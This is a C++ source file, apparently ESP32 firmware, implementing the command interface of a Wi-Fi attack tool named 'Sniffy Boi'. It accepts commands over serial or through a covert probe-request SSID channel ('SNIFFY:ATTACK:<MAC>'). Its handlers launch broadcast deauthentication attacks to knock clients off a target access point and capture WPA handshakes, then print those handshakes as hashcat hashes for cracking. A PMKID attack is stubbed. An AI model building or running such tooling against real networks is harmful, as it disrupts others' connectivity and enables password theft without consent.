#include "CommandInterface.h"

#define MAGIC_PREFIX "SNIFFY:"
#define MAGIC_PREFIX_LEN 7

CommandInterface::CommandInterface(PacketSniffer* sniffer)
    : sniffer(sniffer), serial_buffer(""), last_prompt_time(0) {
}

void CommandInterface::begin() {
    Serial.println("\n╔════════════════════════════════════════════════════════════╗");
    Serial.println("║              COMMAND INTERFACE READY                     ║");
    Serial.println("╚════════════════════════════════════════════════════════════╝");
    Serial.println();
    Serial.println("  Serial CLI:    Type 'help' for commands");
    Serial.println("  Wireless C2:   Send probe with SSID 'SNIFFY:<CMD>'");
    Serial.println();
    Serial.println("════════════════════════════════════════════════════════════");
    Serial.println();

    showPrompt();
}

void CommandInterface::showPrompt() {
    Serial.print("\nsniffy> ");
    last_prompt_time = millis();
}

bool CommandInterface::isMagicPacket(const String& ssid) {
    return ssid.startsWith(MAGIC_PREFIX);
}

void CommandInterface::processSerial() {
    while (Serial.available()) {
        char c = Serial.read();

        if (c == '\n' || c == '\r') {
            if (serial_buffer.length() > 0) {
                Serial.println();  // Echo newline
                Command cmd = parseCommand(serial_buffer, false, nullptr);
                executeCommand(cmd);
                serial_buffer = "";
                showPrompt();
            }
        } else if (c == 0x08 || c == 0x7F) {  // Backspace or DEL
            if (serial_buffer.length() > 0) {
                serial_buffer.remove(serial_buffer.length() - 1);
                Serial.print("\b \b");  // Erase character on terminal
            }
        } else if (c >= 32 && c < 127) {  // Printable ASCII
            serial_buffer += c;
            Serial.print(c);  // Echo character
        }
    }
}

void CommandInterface::processWirelessCommand(const String& ssid, const uint8_t* source_mac) {
    if (!isMagicPacket(ssid)) return;

    Serial.println("\n╔════════════════════════════════════════════════════════════╗");
    Serial.println("║          🎯 WIRELESS COMMAND RECEIVED                    ║");
    Serial.println("╚════════════════════════════════════════════════════════════╝");
    Serial.print("  SSID:   ");
    Serial.println(ssid);
    Serial.print("  From:   ");
    printMACAddress(source_mac);
    Serial.println();
    Serial.println("════════════════════════════════════════════════════════════");

    // Parse and execute
    Command cmd = parseCommand(ssid, true, source_mac);
    executeCommand(cmd);

    showPrompt();
}

Command CommandInterface::parseCommand(const String& input, bool is_wireless, const uint8_t* source_mac) {
    Command cmd;
    cmd.is_wireless = is_wireless;
    if (source_mac) {
        memcpy(cmd.source_mac, source_mac, 6);
    }

    String cleaned = input;
    cleaned.trim();
    cleaned.toUpperCase();

    // Remove magic prefix if wireless
    if (is_wireless) {
        cleaned = cleaned.substring(MAGIC_PREFIX_LEN);
    }

    // Parse command and parameters
    int firstColon = cleaned.indexOf(':');
    String cmdStr;

    if (firstColon > 0) {
        cmdStr = cleaned.substring(0, firstColon);
        String remaining = cleaned.substring(firstColon + 1);

        int secondColon = remaining.indexOf(':');
        if (secondColon > 0) {
            cmd.param1 = remaining.substring(0, secondColon);
            cmd.param2 = remaining.substring(secondColon + 1);
        } else {
            cmd.param1 = remaining;
        }
    } else {
        cmdStr = cleaned;
    }

    // Map command string to type
    if (cmdStr == "SCAN" || cmdStr == "LIST") {
        cmd.type = CommandType::SCAN;
    } else if (cmdStr == "ATTACK" || cmdStr == "DEAUTH") {
        cmd.type = CommandType::ATTACK;
    } else if (cmdStr == "PMKID") {
        cmd.type = CommandType::PMKID;
    } else if (cmdStr == "EXPORT" || cmdStr == "DUMP") {
        cmd.type = CommandType::EXPORT;
    } else if (cmdStr == "STATUS" || cmdStr == "STATS") {
        cmd.type = CommandType::STATUS;
    } else if (cmdStr == "CHANNEL" || cmdStr == "CH") {
        cmd.type = CommandType::CHANNEL;
    } else if (cmdStr == "HOPPING" || cmdStr == "HOP") {
        cmd.type = CommandType::HOPPING;
    } else if (cmdStr == "CLEAR" || cmdStr == "RESET") {
        cmd.type = CommandType::CLEAR;
    } else if (cmdStr == "HELP" || cmdStr == "?") {
        cmd.type = CommandType::HELP;
    } else {
        cmd.type = CommandType::UNKNOWN;
    }

    return cmd;
}

void CommandInterface::executeCommand(const Command& cmd) {
    switch (cmd.type) {
        case CommandType::SCAN:
            handleScan();
            break;
        case CommandType::ATTACK:
            handleAttack(cmd.param1);
            break;
        case CommandType::PMKID:
            handlePMKID(cmd.param1);
            break;
        case CommandType::EXPORT:
            handleExport();
            break;
        case CommandType::STATUS:
            handleStatus();
            break;
        case CommandType::CHANNEL:
            handleChannel(cmd.param1);
            break;
        case CommandType::HOPPING:
            handleHopping(cmd.param1);
            break;
        case CommandType::CLEAR:
            handleClear();
            break;
        case CommandType::HELP:
            handleHelp();
            break;
        case CommandType::UNKNOWN:
            Serial.println("❌ Unknown command. Type 'help' for available commands.");
            break;
    }
}

void CommandInterface::handleScan() {
    auto& devices = sniffer->getDevices();

    Serial.println("\n╔════════════════════════════════════════════════════════════╗");
    Serial.println("║                  DISCOVERED ACCESS POINTS                ║");
    Serial.println("╚════════════════════════════════════════════════════════════╝");
    Serial.println();

    if (devices.empty()) {
        Serial.println("  No APs discovered yet. Wait for beacon frames...");
        return;
    }

    int ap_index = 0;
    for (const auto& device : devices) {
        if (device.second.is_ap) {
            Serial.print("  [");
            Serial.print(ap_index++);
            Serial.print("] ");
            printMACAddress(device.second.mac);
            Serial.print(" | ");
            Serial.print(device.second.ssid.length() > 0 ? device.second.ssid : "(hidden)");
            Serial.print(" | Ch:");
            if (device.second.channels.size() > 0) {
                Serial.print(device.second.channels[0]);
            } else {
                Serial.print("?");
            }
            Serial.print(" | ");

            // Encryption
            switch (device.second.encryption_type) {
                case 0: Serial.print("OPEN"); break;
                case 1: Serial.print("WEP "); break;
                case 2: Serial.print("WPA "); break;
                case 3: Serial.print("WPA2"); break;
                case 4: Serial.print("WPA3"); break;
                default: Serial.print("????");
            }

            Serial.print(" | ");
            Serial.print(device.second.max_rssi);
            Serial.println(" dBm");
        }
    }

    Serial.println();
    Serial.print("  Total APs: ");
    Serial.println(ap_index);
    Serial.println("════════════════════════════════════════════════════════════");
}

void CommandInterface::handleAttack(const String& target_mac) {
    if (target_mac.length() == 0) {
        Serial.println("❌ Usage: attack <MAC_ADDRESS>");
        Serial.println("   Example: attack AABBCCDDEEFF");
        return;
    }

    uint8_t mac[6];
    if (!parseMACAddress(target_mac, mac)) {
        Serial.println("❌ Invalid MAC address format");
        Serial.println("   Use: AABBCCDDEEFF or AA:BB:CC:DD:EE:FF");
        return;
    }

    Serial.println("\n╔════════════════════════════════════════════════════════════╗");
    Serial.println("║            🎯 DEAUTH ATTACK INITIATED                    ║");
    Serial.println("╚════════════════════════════════════════════════════════════╝");
    Serial.print("  Target AP: ");
    printMACAddress(mac);
    Serial.println();
    Serial.println("  Mode:      Broadcast (all clients)");
    Serial.println("  Burst:     5 packets");
    Serial.println("════════════════════════════════════════════════════════════");

    // Send deauth broadcast
    sniffer->sendDeauthBroadcast(mac);

    Serial.println("✓ Deauth sent. Monitor for handshake capture...");
}

void CommandInterface::handlePMKID(const String& target_mac) {
    if (target_mac.length() == 0) {
        Serial.println("❌ Usage: pmkid <MAC_ADDRESS>");
        Serial.println("   Example: pmkid AABBCCDDEEFF");
        return;
    }

    uint8_t mac[6];
    if (!parseMACAddress(target_mac, mac)) {
        Serial.println("❌ Invalid MAC address format");
        return;
    }

    Serial.println("\n╔════════════════════════════════════════════════════════════╗");
    Serial.println("║          🎯 CLIENTLESS PMKID ATTACK                      ║");
    Serial.println("╚════════════════════════════════════════════════════════════╝");
    Serial.print("  Target AP: ");
    printMACAddress(mac);
    Serial.println();
    Serial.println("  Method:    Fake association request");
    Serial.println("════════════════════════════════════════════════════════════");

    Serial.println("❌ PMKID module not yet integrated with command interface");
    Serial.println("   (Implementation pending)");
}

void CommandInterface::handleExport() {
    const auto& handshakes = sniffer->getHandshakes();

    Serial.println("\n╔════════════════════════════════════════════════════════════╗");
    Serial.println("║              HASHCAT EXPORT (MODE 22000)                 ║");
    Serial.println("╚════════════════════════════════════════════════════════════╝");
    Serial.println();

    if (handshakes.empty()) {
        Serial.println("  No handshakes captured yet.");
        return;
    }

    for (size_t i = 0; i < handshakes.size(); i++) {
        const auto& hs = handshakes[i];

        Serial.print("[");
        Serial.print(i);
        Serial.print("] ");
        Serial.println(hs.ssid);
        Serial.print("    ");
        Serial.println(sniffer->exportHandshakeHashcat(hs));
        Serial.println();
    }

    Serial.print("  Total handshakes: ");
    Serial.println(handshakes.size());
    Serial.println("════════════════════════════════════════════════════════════");
}

void CommandInterface::handleStatus() {
    Serial.println("\n╔════════════════════════════════════════════════════════════╗");
    Serial.println("║                   SNIFFY BOI STATUS                      ║");
    Serial.println("╚════════════════════════════════════════════════════════════╝");
    Serial.println();

    Serial.print("  Uptime:       ");
    unsigned long uptime_sec = millis() / 1000;
    Serial.print(uptime_sec / 3600);
    Serial.print("h ");
    Serial.print((uptime_sec % 3600) / 60);
    Serial.print("m ");
    Serial.print(uptime_sec % 60);
    Serial.println("s");

    Serial.print("  Free Memory:  ");
    Serial.print(ESP.getFreeHeap() / 1024);
    Serial.println(" KB");

    Serial.print("  Total Pkts:   ");
    Serial.println(sniffer->getTotalPackets());

    Serial.print("  Beacons:      ");
    Serial.println(sniffer->getBeaconCount());

    Serial.print("  Probes:       ");
    Serial.println(sniffer->getProbeCount());

    Serial.print("  Data Frames:  ");
    Serial.println(sniffer->getDataCount());

    Serial.print("  Deauths:      ");
    Serial.println(sniffer->getDeauthCount());

    Serial.print("  Handshakes:   ");
    Serial.println(sniffer->getHandshakeCount());

    Serial.print("  Devices:      ");
    Serial.println(sniffer->getDevices().size());

    Serial.println("════════════════════════════════════════════════════════════");
}

void CommandInterface::handleChannel(const String& channel_str) {
    if (channel_str.length() == 0) {
        Serial.println("❌ Usage: channel <1-13>");
        return;
    }

    int ch = channel_str.toInt();
    if (ch < 1 || ch > 13) {
        Serial.println("❌ Channel must be 1-13");
        return;
    }

    sniffer->setChannel(ch);
    sniffer->channelHop(false);  // Disable hopping when locking

    Serial.print("✓ Locked to channel ");
    Serial.println(ch);
}

void CommandInterface::handleHopping(const String& state) {
    if (state == "ON" || state == "1" || state == "ENABLE") {
        sniffer->channelHop(true);
        Serial.println("✓ Channel hopping enabled");
    } else if (state == "OFF" || state == "0" || state == "DISABLE") {
        sniffer->channelHop(false);
        Serial.println("✓ Channel hopping disabled");
    } else {
        Serial.println("❌ Usage: hopping <ON|OFF>");
    }
}

void CommandInterface::handleClear() {
    Serial.println("❌ Clear command not yet implemented");
    Serial.println("   (Would reset capture database)");
}

void CommandInterface::handleHelp() {
    Serial.println("\n╔════════════════════════════════════════════════════════════╗");
    Serial.println("║                  COMMAND REFERENCE                       ║");
    Serial.println("╚════════════════════════════════════════════════════════════╝");
    Serial.println();
    Serial.println("  DISCOVERY:");
    Serial.println("    scan                  - List discovered APs");
    Serial.println("    status                - Show capture statistics");
    Serial.println();
    Serial.println("  ATTACKS:");
    Serial.println("    attack <MAC>          - Deauth attack + handshake capture");
    Serial.println("    pmkid <MAC>           - Clientless PMKID attack");
    Serial.println();
    Serial.println("  EXPORT:");
    Serial.println("    export                - Print all hashcat hashes");
    Serial.println();
    Serial.println("  CHANNEL CONTROL:");
    Serial.println("    channel <1-13>        - Lock to specific channel");
    Serial.println("    hopping <ON|OFF>      - Enable/disable channel hopping");
    Serial.println();
    Serial.println("  WIRELESS CONTROL:");
    Serial.println("    Send probe request with SSID:");
    Serial.println("      SNIFFY:SCAN");
    Serial.println("      SNIFFY:ATTACK:AABBCCDDEEFF");
    Serial.println("      SNIFFY:STATUS");
    Serial.println();
    Serial.println("════════════════════════════════════════════════════════════");
}

bool CommandInterface::parseMACAddress(const String& mac_str, uint8_t* mac_out) {
    String cleaned = mac_str;
    cleaned.replace(":", "");
    cleaned.replace("-", "");
    cleaned.toUpperCase();

    if (cleaned.length() != 12) return false;

    for (int i = 0; i < 6; i++) {
        String byteStr = cleaned.substring(i * 2, i * 2 + 2);
        mac_out[i] = (uint8_t)strtol(byteStr.c_str(), NULL, 16);
    }

    return true;
}

void CommandInterface::printMACAddress(const uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        if (mac[i] < 0x10) Serial.print("0");
        Serial.print(mac[i], HEX);
        if (i < 5) Serial.print(":");
    }
}
